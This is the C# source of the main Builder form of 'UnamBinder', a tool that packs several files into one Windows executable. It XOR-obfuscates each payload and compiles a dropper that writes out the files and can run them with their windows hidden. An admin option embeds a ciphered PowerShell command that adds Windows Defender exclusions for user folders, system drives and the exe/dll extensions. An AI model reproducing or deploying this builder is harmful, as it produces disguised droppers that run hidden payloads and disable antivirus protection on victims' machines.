using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Windows.Forms;

namespace UnamBinder
{
    public partial class Builder : Form
    {
        private static Random random = new Random();
        private string key = RandomString(32);

        public Builder()
        {
            InitializeComponent();
        }

        public void NativeCompiler(string savePath)
        {
            string currentDirectory = Path.GetDirectoryName(savePath);
            string filename = Path.GetFileNameWithoutExtension(savePath) + ".c";

            if (Directory.Exists(Path.Combine(currentDirectory, "tinycc"))) {
                Directory.Delete(Path.Combine(currentDirectory, "tinycc"), true);
            }
            using (ZipArchive archive = new ZipArchive(new MemoryStream(Properties.Resources.tinycc)))
            {
                archive.ExtractToDirectory(currentDirectory);
            }

            StringBuilder sb = new StringBuilder(Properties.Resources.Program1);

            List<string> stringarray = new List<string>();
            List<string> intarray = new List<string>();

            int count = listFiles.Items.Count;
            for (int i = 0; i < count; i++)
            {
                File filevar = (File)listFiles.Items[i];
                string droplocation = filevar.comboDropLocation.Text == "Current Directory" ? "cd" : filevar.comboDropLocation.Text;
                byte[] filebytes = { };
                try
                {
                    filebytes = System.IO.File.ReadAllBytes(filevar.txtBindfile.Text);
                }
                catch
                {
                    MessageBox.Show("Could not read the file: " + filevar.txtBindfile.Text + ", make sure that the file exists and that the path is correct.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
                string filestring = Convert.ToBase64String(filebytes);
                stringarray.Add("{\"" + droplocation + "\",\"" + ToLiteral(Cipher(filevar.txtFilename.Text, key)) + "\",\"" + ToLiteral(Cipher(filestring, key)) + "\"}");
                intarray.Add("{" + filevar.txtFilename.Text.Length + "," + (filevar.toggleExecute.Checked ? "1" : "0") + "," + filestring.Length + "," + filebytes.Length + "," + (filevar.toggleHideWindow.Checked ? "1" : "0") + "}");
            }

            if (checkAdmin.Checked)
            {
                sb.Replace("DefWD", "TRUE");
                CipherReplace(sb, "#WDCOMMAND", "cmd /c powershell -Command Add-MpPreference -ExclusionPath @($env:UserProfile,$env:AppData,$env:Temp,$env:SystemRoot,$env:HomeDrive,$env:SystemDrive) -Force & powershell -Command Add-MpPreference -ExclusionExtension @('exe','dll') -Force & exit");
                System.IO.File.WriteAllBytes(Path.Combine(currentDirectory, "manifest.o"), Properties.Resources.manifest);
            }
            sb.Replace("#ARRAYCOUNT", count.ToString());
            sb.Replace("#STRINGARRAY", string.Join(",", stringarray));
            sb.Replace("#INTARRAY", string.Join(",", intarray));
            sb.Replace("#KEY", key);

            System.IO.File.WriteAllText(Path.Combine(currentDirectory, filename), sb.ToString());
            Process.Start(new ProcessStartInfo
            {
                FileName = Path.Combine(currentDirectory, "tinycc\\tcc.exe"),
                Arguments = "-Wall -Wl,-subsystem=windows \"" + filename + "\" " + (checkAdmin.Checked ? "manifest.o" : "") + " -luser32 -m32",
                WorkingDirectory = currentDirectory,
                WindowStyle = ProcessWindowStyle.Hidden
            }).WaitForExit();

            System.IO.File.Delete(Path.Combine(currentDirectory, "manifest.o"));
            System.IO.File.Delete(Path.Combine(currentDirectory, filename));
            if (Directory.Exists(Path.Combine(currentDirectory, "tinycc")))
            {
                Directory.Delete(Path.Combine(currentDirectory, "tinycc"), true);
            }
        }

        public void CipherReplace(StringBuilder source, string id, string value)
        {
            source.Replace(id + "LENGTH", value.Length.ToString());
            source.Replace(id, ToLiteral(Cipher(value, key)));
        }

        public static string RandomString(int length)
        {
            const string chars = "abcdefghijklmnpqrstuvwxyz0123456789";
            const int clength = 35;
            var buffer = new char[length];
            for (var i = 0; i < length; ++i)
            {
                buffer[i] = chars[random.Next(clength)];
            }
            return new string(buffer);
        }

        public string Cipher(string data, string key)
        {
            var result = new StringBuilder();
            for (int c = 0; c < data.Length; c++)
                result.Append((char)((uint)data[c] ^ key[c % key.Length]));
            return result.ToString();
        }

        private static string ToLiteral(string input)
        {
            var literal = new StringBuilder(input.Length + 2);
            foreach (var c in input)
            {
                switch (c)
                {
                    case '\"': literal.Append("\\\""); break;
                    case '\\': literal.Append(@"\\"); break;
                    case '\0': literal.Append(@"\u0000"); break;
                    case '\a': literal.Append(@"\a"); break;
                    case '\b': literal.Append(@"\b"); break;
                    case '\f': literal.Append(@"\f"); break;
                    case '\n': literal.Append(@"\n"); break;
                    case '\r': literal.Append(@"\r"); break;
                    case '\t': literal.Append(@"\t"); break;
                    case '\v': literal.Append(@"\v"); break;
                    default:
                        literal.Append(c);
                        break;
                }
            }
            return literal.ToString();
        }

        public string SaveDialog(string filter)
        {
            SaveFileDialog dialog = new SaveFileDialog();
            dialog.Filter = filter;
            dialog.InitialDirectory = Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location);
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                return dialog.FileName;
            }
            return "";
        }

        private void btnAdd_Click(object sender, EventArgs e)
        {
            File add = new File();
            add.builder = this;
            add.Show();
            listFiles.Items.Add(add);
        }

        private void btnEdit_Click(object sender, EventArgs e)
        {
            if (listFiles.SelectedItem != null)
            {
                ((File)listFiles.SelectedItem).Show();
            }
        }

        private void btnRemove_Click(object sender, EventArgs e)
        {
            if (listFiles.SelectedItem != null)
            {
                ((File)listFiles.SelectedItem).Hide();
                listFiles.Items.Remove(listFiles.SelectedItem);
            }
        }

        private void linkGitHub_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://github.com/UnamSanctam/UnamBinder");
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            if (listFiles.Items.Count == 0)
            {
                MessageBox.Show("You need to add at least one file to bind before building.", "Incorrect build!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            string save = SaveDialog("Exe Files (.exe)|*.exe|All Files (*.*)|*.*");

            if (save.Length > 0)
            {
                NativeCompiler(save);
            }
        }
    }
}
